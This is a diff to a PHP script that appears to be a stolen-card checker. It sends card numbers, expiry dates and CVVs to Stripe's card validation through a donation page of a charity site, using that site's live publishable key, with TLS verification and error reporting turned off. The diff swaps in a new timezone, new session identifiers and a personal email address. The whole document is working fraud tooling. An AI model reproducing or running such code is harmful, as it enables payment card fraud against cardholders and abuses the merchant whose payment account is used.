@@ -5,7 +5,7 @@
 error_reporting(0);
 set_time_limit(0);
 error_reporting(0);
-date_default_timezone_set('America/Buenos_Aires');
+date_default_timezone_set('Asia/Manila');
 
 
 function multiexplode($delimiters, $string)
@@ -79,7 +79,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'accept-encoding: gzip, deflate, br', 
 'content-type: application/x-www-form-urlencoded',
 'origin: https://checkout.stripe.com',
-'referer: https://checkout.stripe.com/m/v3/index-7f66c3d8addf7af4ffc48af15300432a.html?distinct_id=0be0d02d-3c8d-86b8-7b17-50525b82d327',
+'referer: https://checkout.stripe.com/m/v3/index-7f66c3d8addf7af4ffc48af15300432a.html?distinct_id=1906c9f4-5c86-b7c3-d5b1-35ccad8aa90a',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-site'));
@@ -90,7 +90,7 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=https%3A%2F%2Frockwellridewell.org%2F%3Fcampaign%3Dmake-a-donation%26donate%3D1&pasted_fields=number&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]='.$email.'&time_on_page=24643&guid=c32ea8ce-7441-43c0-9448-e50fb6447e3f&muid=44f9c2f3-51bf-4c3c-b1cc-3789deb5a487&sid=97751f84-6afb-49e8-8dbe-17b781e7c045&key=pk_live_iUEhsuVs9Uohtd200Ys8CvuN');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=https%3A%2F%2Frockwellridewell.org%2F%3Fcampaign%3Dmake-a-donation%26donate%3D1&pasted_fields=number&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]=cyronavila%40gmail.com&time_on_page=165867&guid=c32ea8ce-7441-43c0-9448-e50fb6447e3f&muid=11b24020-e2fe-46f9-93cc-0067c9715434&sid=7dbb9b0c-9dda-4490-8f81-6db7900dca34&key=pk_live_iUEhsuVs9Uohtd200Ys8CvuN');
 $result = curl_exec($ch);
 
 ///$token = trim(strip_tags(getStr($result,'"id": "','"')));
